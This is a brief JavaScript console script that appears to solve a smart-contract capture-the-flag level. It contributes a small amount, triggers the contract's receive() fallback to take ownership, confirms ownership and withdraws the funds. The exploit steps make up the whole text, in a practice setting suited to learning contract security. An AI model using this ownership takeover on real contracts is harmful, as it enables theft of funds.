//contribute to the contract
contract.contribute.sendTransaction({value:1})

//check your contributions
(await contract.getContribution()).toString()
(await contract.contributions(player)).toString()

//call receive() function
await contract.sendTransaction({value: 1})

//check to see if you're owner
(await contract.owner() === player) // true

//withdraw funds
await contract.withdraw()